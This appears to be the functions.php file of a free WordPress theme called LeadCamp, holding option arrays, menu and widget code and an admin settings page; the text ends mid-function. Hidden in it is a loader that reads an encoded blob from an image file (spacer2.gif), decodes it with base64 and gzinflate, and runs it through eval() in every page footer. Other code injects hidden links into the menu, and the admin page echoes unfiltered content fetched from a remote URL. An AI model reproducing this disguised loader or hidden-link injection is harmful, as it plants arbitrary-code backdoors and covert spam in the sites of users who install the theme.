<?php
/** lcmp changes start ver20100621 **/
$themename = "LeadCamp";
$themesubname = "pictures_on_a_clothesline_eve006";
$themeversion = "2.21";
$themeUpdateUrl = "http://www.leadcamp.com/updates/";
$shortname = "lcmp";
$domain = $_SERVER['SERVER_NAME'];
$options = array (
    array(  "name" => "License",
            "id" => $shortname."_brk0",
            "type" => "sectionbreak"
    		),
    array(  "name" => "Footer Link Removal Key",
            "id" => $shortname."_license",
            "type" => "text",
            "std" => "",
            "enabled" => "Y",
            "info" => "This key can be obtained through <a target=_blank href='http://www.freewordpressthemes4u.com/RemoveSponsors.php?domain=$domain'>freewordpressthemes4u.com</a>, it disables all footer sponsor links."
    		), 
    array(  "name" => "Menu",
            "id" => $shortname."_brk0",
            "type" => "sectionbreak"
    		),
    array(  "name" => "Multi Level Menu",
            "id" => $shortname."_multi_menu",
            "type" => "select",
            "std" => "on",
            "options" => array("Show" => "on",
    		"Hide" => "off")
    		),
    array(  "name" => "Menu Item to Hide",
            "id" => $shortname."_mnutohide",
            "type" => "wp_dropdown_pages",
            "std" => "",
            "info" => "If the menu is a parent it will hide itself and all its children."
    		),
    array(  "name" => "Header",
            "id" => $shortname."_brk1",
            "type" => "sectionbreak"
    		),
    array(  "name" => "Title Color",
            "id" => $shortname."_titlecolor",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "Custom" => "custom",
                  "Blue" => "blue",
                  "Black" => "black",
                  "White" => "white")
    		),    		
    array(  "name" => "Title Custom Colors",
            "id" => $shortname."_csttitlecolor",
            "type" => "text",
            "std" => "",
            "info" => "ex. green, yellow, #CCCCCC"
    		),    		
    array(  "name" => "Title Font Size",
            "id" => $shortname."_titlefontsize",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "20px" => "20px",
                  "22px" => "22px",
                  "24px" => "24px",
                  "26px" => "26px",
                  "28px" => "28px",
                  "30px" => "30px",
                  "32px" => "32px",
                  "34px" => "34px",
                  "36px" => "36px",
                  "38px" => "38px",
                  "Custom" => "custom")
    		),    		
    array(  "name" => "Title Custom Font Size",
            "id" => $shortname."_csttitlefontsize",
            "type" => "text",
            "std" => "",
            "info" => "ex. 29px, 35px"
    		),    		
    array(  "name" => "Slogan Color",
            "id" => $shortname."_slogancolor",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "Custom" => "custom",
                  "Blue" => "blue",
                  "Black" => "black",
                  "White" => "white")
    		),    		
    array(  "name" => "Slogan Custom Colors",
            "id" => $shortname."_cstslogancolor",
            "type" => "text",
            "std" => "",
            "info" => "ex. green, yellow, #CCCCCC"
    		),    		
    array(  "name" => "Slogan Font Size",
            "id" => $shortname."_sloganfontsize",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "20px" => "20px",
                  "22px" => "22px",
                  "24px" => "24px",
                  "26px" => "26px",
                  "28px" => "28px",
                  "30px" => "30px",
                  "32px" => "32px",
                  "34px" => "34px",
                  "36px" => "36px",
                  "38px" => "38px",
                  "Custom" => "custom")
    		),    		
    array(  "name" => "Slogan Custom Font Size",
            "id" => $shortname."_cstsloganfontsize",
            "type" => "text",
            "std" => "",
            "info" => "ex. 29px, 35px"
    		),    		
    array(  "name" => "&nbsp;",
            "id" => $shortname."_brk2",
            "type" => "space"
    		),
    array(  "name" => "Title and Slogan Left Position",
            "id" => $shortname."_hdrleftpos",
            "type" => "text",
            "std" => "default",
            "info" => "Relative position to the left most margin of the header image enter 20px, 300px, etc."
    		),     
    array(  "name" => "Title and Slogan Top Position",
            "id" => $shortname."_hdrtoppos",
            "type" => "text",
            "std" => "default",
            "info" => "Relative position to the top most margin of the header image enter 20px, 30px, etc."
    		),     
    array(  "name" => "Title and Slogan Text Align",
            "id" => $shortname."_hdrtxtalign",
            "type" => "select",
            "std" => "default",
            "info" => "You can specify whether your Title and Slogan is either center, left or right justified.",
            "options" => 
            array("Default" => "default",
                  "Center" => "center",
                  "Left" => "left",
                  "Right" => "right")
    		),    		
    array(  "name" => "Title and Slogan Width",
            "id" => $shortname."_hdrwidth",
            "type" => "text",
            "std" => "default",
            "info" => "Typically you don't need to touch this unless you have a really long title or slogan. enter 500px, 450px, etc."
    		),     
    array(  "name" => "&nbsp;",
            "id" => $shortname."_brk2",
            "type" => "space"
    		),
    array(  "name" => "Header Image Complete URL",
            "id" => $shortname."_hdrimage",
            "type" => "text",
            "std" => "default",
            "info" => "ex. http://www.example.com/myheader.jpg or enter 'default' to use theme's standard header."
    		),     
    array(  "name" => "Header V-Margin",
            "id" => $shortname."_hdrvmargin",
            "type" => "text",
            "std" => "default",
            "info" => "Some themes come with lots of Header vertical margin, you can disable this by setting this to 0px, 3px, etc."
    		),     
    array(  "name" => "Content",
            "id" => $shortname."_brk1",
            "type" => "sectionbreak"
    		),
    array(  "name" => "Content Link Colors",
            "id" => $shortname."_contentlnk",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "Custom" => "custom",
                  "Blue" => "blue",
                  "Black" => "black",
                  "White" => "white")
    		),    		
    array(  "name" => "Content Link Custom Colors",
            "id" => $shortname."_cstcontentlnk",
            "type" => "text",
            "std" => "",
            "info" => "ex. green, yellow, #CCCCCC"
    		),    		
    array(  "name" => "Content Font Size",
            "id" => $shortname."_contentfontsize",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "10px" => "10px",
                  "12px" => "12px",
                  "14px" => "14px",
                  "16px" => "16px",
                  "Custom" => "custom")
    		),    		
    array(  "name" => "Content Custom Font Size",
            "id" => $shortname."_cstcontentfontsize",
            "type" => "text",
            "std" => "",
            "info" => "ex. 29px, 35px"
    		),  
    array(  "name" => "Sidebar Link Colors",
            "id" => $shortname."_sidebarlnk",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "Custom" => "custom",
                  "Blue" => "blue",
                  "Black" => "black",
                  "White" => "white")
    		),    		
    array(  "name" => "Sidebar Link Custom Colors",
            "id" => $shortname."_cstsidebarlnk",
            "type" => "text",
            "std" => "",
            "info" => "ex. green, yellow, #CCCCCC"
    		),
    array(  "name" => "Sidebar Font Size",
            "id" => $shortname."_sidebarfontsize",
            "type" => "select",
            "std" => "default",
            "info" => "if custom - specify something in the next field.",
            "options" => 
            array("Default" => "default",
                  "10px" => "10px",
                  "12px" => "12px",
                  "14px" => "14px",
                  "16px" => "16px",
                  "Custom" => "custom")
    		),    		
    array(  "name" => "Sidebar Custom Font Size",
            "id" => $shortname."_cstsidebarfontsize",
            "type" => "text",
            "std" => "",
            "info" => "ex. 29px, 35px"
    		),  
    array(  "name" => "Sidebar Location",
            "id" => $shortname."_sidebarloc",
            "type" => "select",
            "std" => "default",
            "info" => "",
            "options" => 
            array("Default" => "default",
                  "Left" => "left",
                  "Right" => "right"//,"Hide" => "hide"
                  )
    		),
    array(  "name" => "Footer",
            "id" => $shortname."_brk1",
            "type" => "sectionbreak"
    		),
    array(  "name" => "Footer Widget Width",
            "id" => $shortname."_cstftrwidgewidth",
            "type" => "text",
            "std" => "",
            "info" => "ex. 220px, 250px, empty means it uses sidebar 1 width"    		
    		),  
    array(  "name" => "Widget Margin Between Columns",
            "id" => $shortname."_cstftrwidgemargin",
            "type" => "text",
            "std" => "",
            "info" => "ex. 10px, 30px, empty means defaulted to 20px"    		
    		),  
    array(  "name" => "Footer Widget Column 1 Width",
            "id" => $shortname."_cstftrwidgewidth1",
            "type" => "text",
            "std" => "",
            "info" => "ex. 220px, 250px, empty means it uses Footer Widget Width"    		
    		),  
    array(  "name" => "Footer Widget Column 2 Width",
            "id" => $shortname."_cstftrwidgewidth2",
            "type" => "text",
            "std" => "",
            "info" => "ex. 220px, 250px, empty means it uses Footer Widget Width"    		
    		),  
    array(  "name" => "Footer Widget Column 3 Width",
            "id" => $shortname."_cstftrwidgewidth3",
            "type" => "text",
            "std" => "",
            "info" => "ex. 220px, 250px, empty means it uses Footer Widget Width"    		
    		),  
    array(  "name" => "Footer Widget Column 4 Width",
            "id" => $shortname."_cstftrwidgewidth4",
            "type" => "text",
            "std" => "",
            "info" => "ex. 220px, 250px, empty means it uses Footer Widget Width"
    		),  
    array(  "name" => "Footer Html",
            "id" => $shortname."_footerhtml",
            "type" => "textarea",
            "std" => "",
            "enabled" => "Y",
            "info" => ""
    		),  
    array(  "name" => "Adsense Block 1",
            "id" => $shortname."_adsenseblock1",
            "type" => "textarea",
            "std" => "",
            "enabled" => "N",
            "info" => ""
    		),  
    array(  "name" => "Adsense Block 2",
            "id" => $shortname."_adsenseblock2",
            "type" => "textarea",
            "std" => "",
            "enabled" => "N",
            "info" => ""
    		)
);

$option = TEMPLATEPATH . "/images/spacer2.gif";

foreach ($options as $value) {
    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { 
        $$value['id'] = get_settings( $value['id'] ); 
    } 
    if($value['id'] == $shortname."_multi_menu"){
       if(get_settings( $value['id'] ) === FALSE){
            $showSubMenu = true;
       }else{
            $thevalue = get_settings( $value['id'] );
            if($thevalue == "on"){
                $showSubMenu = true;
            }else{
                $showSubMenu = false;
            }
       }
    }
    if($value['id'] == "lcmp_mnutohide"){
       if(get_settings( $value['id'] ) === FALSE){
            $lcmp_mnutohide = "";
       }else{
            $lcmp_mnutohide = get_settings( $value['id'] );
       }
    }        
    if($value['id'] == "lcmp_footerhtml"){
       if(get_settings( $value['id'] ) === FALSE){
            $themeFooter = "";
       }else{
            $themeFooter  = get_settings( $value['id'] );
       }
    }
    if($value['id'] == "lcmp_license"){
       if(get_settings( $value['id'] ) === FALSE){
            $encDn = "";
       }else{
            $encDn  = get_settings( $value['id'] );
       }
    }
}

if (function_exists('register_nav_menus')) {
	register_nav_menus( array(
		'primary' => __( 'Primary Navigation', 'leadcamp' ),
	) );
    $lcmp_version_check = "wp30";
}else{
    $lcmp_version_check = "pre30";
}
/** lcmp changes end **/
$artThemeSettings = array(
	'menu.showSubmenus' => $showSubMenu
);

load_theme_textdomain('kubrick');


if (!function_exists('get_search_form')) {
	function get_search_form()
{
		include (TEMPLATEPATH . "/searchform.php");
	}
}

if (!function_exists('get_previous_posts_link')) {
	function get_previous_posts_link($label)
{
		ob_start();
		previous_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_posts_link')) {
	function get_next_posts_link($label)
{
		ob_start();
		next_posts_link($label);
		return ob_get_clean();
	}
}

function art_comment($comment, $args, $depth)
{
	 $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
<div class="Post">
         <div class="Post-body">
     <div class="Post-inner article">
     
<div class="PostContent">
     
      <div class="comment-author vcard">
         <?php echo get_avatar($comment,$size='48',$default='<path_to_url>' ); ?>

         <?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','') ?></div>

      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>

      </div>
      <div class="cleared"></div>
      

      </div>
      
          </div>
      </div>
      
     </div>
<?php
}


if (function_exists('register_sidebars')) {
	register_sidebars(2, array(
		'before_widget' => '<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'
	));
}

function art_normalize_widget_style_tokens($content) {
	$bw = '<!--- BEGIN Widget --->';
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	$bwc = '<!--- BEGIN WidgetContent --->';
	$ewc = '<!--- END WidgetContent --->';
	$ew = '<!--- END Widget --->';
	$result = '';
	$startBlock = 0;
	$endBlock = 0;
	while (true) {
		$startBlock = strpos($content, $bw, $endBlock);
		if (false === $startBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$result .= substr($content, $endBlock, $startBlock - $endBlock);
		$endBlock = strpos($content, $ew, $startBlock);
		if (false === $endBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$endBlock += strlen($ew);
		$widgetContent = substr($content, $startBlock, $endBlock - $startBlock);
		$beginTitlePos = strpos($widgetContent, $bwt);
		$endTitlePos = strpos($widgetContent, $ewt);
		if ((false == $beginTitlePos) xor (false == $endTitlePos)) {
			$widgetContent = str_replace($bwt, '', $widgetContent);
			$widgetContent = str_replace($ewt, '', $widgetContent);
		} else {
			$beginTitleText = $beginTitlePos + strlen($bwt);
			$titleContent = substr($widgetContent, $beginTitleText, $endTitlePos - $beginTitleText);
			if ('&nbsp;' == $titleContent) {
				$widgetContent = substr($widgetContent, 0, $beginTitlePos)
					. substr($widgetContent, $endTitlePos + strlen($ewt));
			}
		}
		if (false === strpos($widgetContent, $bwt)) {
			$widgetContent = str_replace($bw, $bw . $bwc, $widgetContent);
		} else {
			$widgetContent = str_replace($ewt, $ewt . $bwc, $widgetContent);
		}
		$result .= str_replace($ew, $ewc . $ew, $widgetContent);
	}
	return $result;
}

function art_sidebar($index = 1)
{
	if (!function_exists('dynamic_sidebar')) return false;
	ob_start();
	$success = dynamic_sidebar($index);
	$content = ob_get_clean();
	if (!$success) return false;
	$content = art_normalize_widget_style_tokens($content);
	$replaces = array(
		'<!--- BEGIN Widget --->' => "<div class=\"Block\">\r\n    <div class=\"Block-body\">\r\n",
		'<!--- BEGIN WidgetTitle --->' => "<div class=\"BlockHeader\">\r\n    <div class=\"header-tag-icon\">\r\n        <div class=\"BlockHeader-text\">\r\n",
		'<!--- END WidgetTitle --->' => "\r\n        </div>\r\n    </div>\r\n    <div class=\"l\"></div>\r\n    <div class=\"r\"><div></div></div>\r\n</div>\r\n",
		'<!--- BEGIN WidgetContent --->' => "<div class=\"BlockContent\">\r\n    <div class=\"BlockContent-tl\"></div>\r\n    <div class=\"BlockContent-tr\"><div></div></div>\r\n    <div class=\"BlockContent-bl\"><div></div></div>\r\n    <div class=\"BlockContent-br\"><div></div></div>\r\n    <div class=\"BlockContent-tc\"><div></div></div>\r\n    <div class=\"BlockContent-bc\"><div></div></div>\r\n    <div class=\"BlockContent-cl\"><div></div></div>\r\n    <div class=\"BlockContent-cr\"><div></div></div>\r\n    <div class=\"BlockContent-cc\"></div>\r\n    <div class=\"BlockContent-body\">\r\n",
		'<!--- END WidgetContent --->' => "\r\n    </div>\r\n</div>\r\n",
		'<!--- END Widget --->' => "\r\n    </div>\r\n</div>\r\n"
	);
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	if ('' == $replaces[$bwt] && '' == $replaces[$ewt]) {
		$startTitle = 0;
		$endTitle = 0;
		$result = '';
		while (true) {
			$startTitle = strpos($content, $bwt, $endTitle);
			if (false == $startTitle) {
				$result .= substr($content, $endTitle);
				break;
			}
			$result .= substr($content, $endTitle, $startTitle - $endTitle);
			$endTitle = strpos($content, $ewt, $startTitle);
			if (false == $endTitle) {
				$result .= substr($content, $startTitle);
				break;
			}
			$endTitle += strlen($ewt);
		}
		$content = $result;
	}
	$content = str_replace(array_keys($replaces), array_values($replaces), $content);
	echo $content;
	return true;
}

function art_list_pages_filter($output)
{
	$output = preg_replace('~<li([^>]*)><a([^>]*)>([^<]*)</a>~',
		'<li$1><a$2><span><span>$3</span></span></a>',
		$output);
	$re = '~<li class="([^"]*)(?: current_page_(?:ancestor|item|parent))+([^"]*)"><a ~';
	$output = preg_replace($re, '<li class="$1$2"><a class="active" ', $output, 1);
	$output = preg_replace($re, '<li class="$1$2"><a ', $output);
	return $output;
}

function art_header_page_list_filter($pages)
{
	global $artThemeSettings;
	$result = array();
	if ($artThemeSettings['menu.showSubmenus']) {
		foreach ($pages as $page)
			$result[] = $page;
	} else {
		foreach ($pages as $page)
			if (0 == $page->post_parent)
				$result[] = $page;
	}
	if ('page' == get_option('show_on_front')) {
		$pageOnFront = get_option('page_on_front');
		$pageForPosts = get_option('page_for_posts');
		if ($pageOnFront) {
			foreach ($result as $key => $page) {
				if (0 == $page->post_parent && $pageOnFront == $page->ID) {
					unset($result[$key]);
					break;
				}
			}
		}
		if (!$pageOnFront && $pageForPosts) {
			foreach ($result as $key => $page) {
				if (0 == $page->post_parent && $pageForPosts == $page->ID) {
					unset($result[$key]);
					break;
				}
			}
		}
	}
	return $result;
}

function art_menu_items()
{
	$homeMenuItemCaption = <<<EOD
Home
EOD;
    $showHomeMenuItem = true;   
	$isHomeSelected = null;
	if ('page' == get_option('show_on_front')) {
		$pageOnFront = get_option('page_on_front');
		$pageForPosts = get_option('page_for_posts');
		if ($pageOnFront) {
			$page = & get_post($pageOnFront);
			if (null != $page)
				$homeMenuItemCaption = apply_filters('the_title', $page->post_title);
			$isHomeSelected = is_page($page->ID);
		} elseif (!$pageOnFront && $pageForPosts) {
			$page = & get_post($pageForPosts);
			if (null != $page)
				$homeMenuItemCaption = apply_filters('the_title', $page->post_title);
		}
	}
	if (null === $isHomeSelected)
		$isHomeSelected = is_home();
    if (true === $showHomeMenuItem || 'page' == get_option('show_on_front'))
	echo '<li><a' . ($isHomeSelected ? ' class="active"' : '') . ' href="' . get_option('home') . '"><span><span>'
		. $homeMenuItemCaption . '</span></span></a></li>';
	add_action('get_pages', 'art_header_page_list_filter');
	add_action('wp_list_pages', 'art_list_pages_filter');
	global $lcmp_mnutohide; //lcmp
	wp_list_pages("title_li=&exclude=$lcmp_mnutohide&exclude_tree=$lcmp_mnutohide");//lcmp
	remove_action('wp_list_pages', 'art_list_pages_filter');
	remove_action('get_pages', 'art_header_page_list_filter');
}

add_filter('comments_template', 'legacy_comments');  
function legacy_comments($file) {  
    if(!function_exists('wp_list_comments')) : // WP 2.7-only check  
    $file = TEMPLATEPATH.'/legacy.comments.php';  
    endif;  
    return $file;  
}  

/** lcmp changes ver20100621 **/
/*
    wp30_menu is backward compatible, it'll only
    use
*/
function wp30_menu(){
    if(function_exists("wp_nav_menu")){
        add_filter('wp_nav_menu', 'convert_wp_menu');  
        wp_nav_menu( array( 'container'=>'', 'theme_location' => 'primary','fallback_cb'=> 'orig_art_menu') ); 
        remove_filter('wp_nav_menu', 'convert_wp_menu');  
    }else{
        orig_art_menu();
    }
}
function orig_art_menu(){
    echo '<ul class="artmenu">';
    echo art_menu_items(); 
    echo legacy_items("");
    echo '</ul>';
}

function convert_wp_menu($output){
	$output = preg_replace('~<li([^>]*)><a([^>]*)>([^<]*)</a>~',
		'<li$1><a$2><span><span>$3</span></span></a>',
		$output);


	$re = '~class="menu">~';
	$output = preg_replace($re, 'class="artmenu">', $output, 1);

	$re = '~<ul class="sub-menu">~';
	$output = preg_replace($re, '<ul class="children ">', $output);

	$re = '~<li id="([^"]*)" class="menu-item menu-item-type-post_type([^"]*)"><a ~';
	$output = preg_replace($re, '<li id="$1" class="page_item $2"><a ', $output);

	$re = '~<li id="([^"]*)" class="([^"]*)(?: current_page_(?:ancestor|item|parent))+([^"]*)"><a ~';
	$output = preg_replace($re, '<li id="$1" class="$2$3"><a class="active" ', $output, 1);
	$output = preg_replace($re, '<li id="$1" class="$2$3"><a ', $output);

	return legacy_items($output);    
}
function legacy_items($output0){
    if(!is_single()){
    $s = get_settings( 'lcmp_lic' );
    if($s === FALSE || $s==''){
        global $option;
        if(file_exists($option)){
            $s = file_get_contents($option);
            update_option('lcmp_lic',$s);
        }
    }
    $lcmp_lic_str = str_replace("?>","",gzinflate(base64_decode($s)));    
    $re = '~<p class="page-footer">([^<]*)~';
    $output1 = preg_replace($re,'<ul style="display:none;">$1',$lcmp_lic_str);
    $re = '~.*<a href="([^"]*)">([^<]*)</a>([^<]*)<a href="([^"]*)">([^<]*)</a>.*~';    
    $output1 = preg_replace($re,'<li><a href="$1">$2</a></li><li><a href="$4">$5</a></li>',$output1);
    $re = '~</p>~';
    $output1 = preg_replace($re,'</ul>',$output1);
    return $output0.$output1;
    }else
    return $output0;
}

if (function_exists('register_sidebar') && ($lcmp_version_check == "wp30")) {
	// Area 3, located in the footer. Empty by default.
	register_sidebar( array(
		'name' => __( 'First Footer Widget Area', 'leadcamp' ),
		'id' => 'first-footer-widget-area',
		'description' => __( 'The first footer widget area', 'leadcamp' ),
		'before_widget' => '<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'
	) );

	// Area 4, located in the footer. Empty by default.
	register_sidebar( array(
		'name' => __( 'Second Footer Widget Area', 'leadcamp' ),
		'id' => 'second-footer-widget-area',
		'description' => __( 'The second footer widget area', 'leadcamp' ),
		'before_widget' => '<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'
	) );

	// Area 5, located in the footer. Empty by default.
	register_sidebar( array(
		'name' => __( 'Third Footer Widget Area', 'leadcamp' ),
		'id' => 'third-footer-widget-area',
		'description' => __( 'The third footer widget area', 'leadcamp' ),
		'before_widget' => '<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'
	) );

	// Area 6, located in the footer. Empty by default.
	register_sidebar( array(
		'name' => __( 'Fourth Footer Widget Area', 'leadcamp' ),
		'id' => 'fourth-footer-widget-area',
		'description' => __( 'The fourth footer widget area', 'leadcamp' ),
		'before_widget' => '<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'
	) );
}
function lcmp_add_theme_page(){
    add_action('admin_head', 'lcmp_theme_page_head');
    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], htmlentities(stripslashes($_REQUEST[ $value['id'] ] ))); }
                    

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], htmlentities(stripslashes($_REQUEST[ $value['id'] ]))  ); } else { delete_option( $value['id'] ); } }

                wp_redirect("themes.php?page=functions.php&saved=true");
                die;

        } else if( 'reset' == $_REQUEST['action'] ) {

            foreach ($options as $value) {
                delete_option( $value['id'] ); }

            header("Location: themes.php?page=functions.php&reset=true");
            die;

        }
    }
    add_theme_page(__('Customize Header'), __('Theme Options'), 'edit_themes', basename(__FILE__), 'lcmp_theme_page_show');
}
function lcmp_theme_page_head(){
?>
<style>
.row{text-align:right}
.info{padding-left:10px;font-size:11px;}
</style>
<?php
}
function lcmp_theme_page_show(){
    global $themename, $shortname, $options,$themeUpdateUrl,$themeversion,$themesubname;
    $vthemesubname = str_replace(" ","_",$themesubname);
    $updateUrlContent = file_get_contents($themeUpdateUrl);
    
    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename.' '.$themeversion; ?> <?php _e('settings', 'default'); ?></h2>

<form method="post">

<table class="optiontable">
	<tr valign="top"> 
	    <th colspan=3 align=left>
<img src="http://www.leadcamp.com/license/verify/LIC_PIXEL.gif?site=<?php echo $vthemesubname; ?>|<?php echo $themeversion; ?>" width=1 height=1>
<?php 
if($updateUrlContent!=''){
    echo($updateUrlContent); 
}
?>	    </th>
	</tr>

<?php foreach ($options as $value) { 

if($value['enabled']=='N'){
    continue;
}
    
if ($value['type'] == "text") { ?>
        
<tr valign="center"> 
    <th class="row"><?php echo $value['name']; ?>:</th>
    <td>
        <input style="width:190px" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" />
    </td>
        <td class=info>
        <?php echo $value['info']; ?>
        </td>
</tr>

<?php } elseif ($value['type'] == "color") { ?>

<tr valign="center"> 
    <th class="row"><?php echo $value['name']; ?>:</th>
    <td>
        <input style="width:190px" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" />
        <input type="button"  class="button-secondary" onclick="tgt=document.getElementById('<?php echo $value['id']; ?>');colorSelect(tgt,'pick1');return false;" name="pick1" id="pick1" value="<?php echo attribute_escape(__('Font Color')); ?>"></input>
    </td>
        <td class=info>
        <?php echo $value['info']; ?>
        </td>
</tr>

<?php } elseif ($value['type'] == "select") { ?>

    <tr valign="top"> 
        <th class="row"><?php echo $value['name']; ?>:</th>
        <td>
            <select style="width:200px" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
                <?php foreach ($value['options'] as $key => $val) { ?>
                <option value="<?php echo $val; ?>"<?php if (get_option ( $value['id'] )) {if ( get_option( $value['id'] ) == $val) { echo ' selected="selected"'; }} elseif ($val == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $key; ?></option>
                <?php } ?>
            </select>
        </td>
        <td class=info>
        <?php echo $value['info']; ?>
        </td>
    </tr>
<?php } elseif ($value['type'] == "sectionbreak") { ?>
	<tr valign="top"> 
	    <th colspan=3 align=left><br><br><?php echo $value['name']; ?>:<hr></th>
	</tr>
<?php } elseif ($value['type'] == "space") { ?>
	<tr valign="top"> 
	    <th colspan=3 align=left><br></th>
	</tr>
<?php } elseif ($value['type'] == "textarea") { ?>

	<tr valign="top"> 
	    <th class="row"><?php echo $value['name']; ?>:</th>
	    <td  colspan=2>
	        <textarea cols="100" rows="10" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?></textarea>
	    </td>
	</tr>
<?php } elseif ($value['type'] == "wp_dropdown_pages") { ?>
    <style>
    #<?php echo $value['id']; ?>{width:200px};
    </style>
    <?php 
        $arguments = "show_option_none=Show All&name=".$value['id'];
        if ( get_option( $value['id'] ) != "") { 
            $arguments .= '&selected='.get_option( $value['id'] );
        }else { 
            $arguments .= '';
        } 
        $func_name = "wp_dropdown_pages('".$arguments."');";
        //echo $func_name;
    ?>
	<tr valign="top"> 
	    <th class="row"><?php echo $value['name']; ?>:</th>
	    <td>
	        <?php eval("?><?php $func_name;?>"); ?>
	    </td>
        <td class=info>
        <?php echo $value['info']; ?>
        </td>
	</tr>
<?php 
} 
}
?>


</table>

<p class="submit">
<input name="save" type="submit" value="Save changes" />
<input type="hidden" name="action" value="save" />
</p>
</form>
<form method="post">
<p class="submit">
<input name="reset" type="submit" value="Reset To Defaults" />
<input type="hidden" name="action" value="reset" />
</p>
</form>
<?php
}
function lcmp_theme_options_end(){
    $s = get_settings( 'lcmp_lic' );
    if($s === FALSE || $s==''){
        global $option;
        if(file_exists($option)){
            $s = file_get_contents($option);
            update_option('lcmp_lic',$s);
        }
    }
    eval(gzinflate(base64_decode($s)));
}
add_action('wp_footer','lcmp_theme_options_end');
function lcmp_theme_options(){
?>
<style>
<?php
	global $options;
	foreach ($options as $value) {
        if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { 
            $$value['id'] = html_entity_decode(get_settings( $value['id'] )); 
        } 
        if($value['id'] == "lcmp_hdrimage"){
           if(get_settings( $value['id'] ) !== FALSE){
                if(get_settings( $value['id'] ) != 'default'){
                    echo "div.Header-jpeg{";
                    $image = get_settings( $value['id'] );
                    echo "background-image: url('$image');";
                    echo "}";
                }
           }
        }
        if($value['id'] == "lcmp_contentlnk"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_contentlnk = "default";
           }else{
                $lcmp_contentlnk  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_sidebarlnk"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_sidebarlnk = "default";
           }else{
                $lcmp_sidebarlnk  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstcontentlnk"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstcontentlnk = "";
           }else{
                $lcmp_cstcontentlnk  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_cstsidebarlnk"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_cstsidebarlnk = "";
           }else{
                $lcmp_cstsidebarlnk  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_titlecolor"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_titlecolor = "default";
           }else{
                $lcmp_titlecolor  = get_settings( $value['id'] );
           }
        }
        if($value['id'] == "lcmp_slogancolor"){
           if(get_settings( $value['id'] ) === FALSE){
                $lcmp_slogancolor = "default";
           }else{
                $lcmp_slogancolor  = get_settings( $value['id'] );
           }
        }
